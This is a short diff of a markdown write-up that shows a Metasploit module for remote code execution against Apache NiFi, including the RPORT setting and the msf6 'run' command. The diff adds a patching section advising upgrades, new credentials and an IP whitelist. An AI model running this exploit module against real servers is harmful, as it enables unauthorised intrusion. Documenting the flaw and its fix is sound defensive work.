@@ -40,3 +40,5 @@ RPORT => 8080</pre>
 # Running Exploit
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > run</pre>
 ![msf2](https://user-images.githubusercontent.com/94451745/149520071-97c27099-82df-493b-9ead-a5a96afcc29b.png)
+# Vulnerability patching
+Upgrade to the latest version, add/change current credentials and setup an IP whitelist in your current firewall settings.
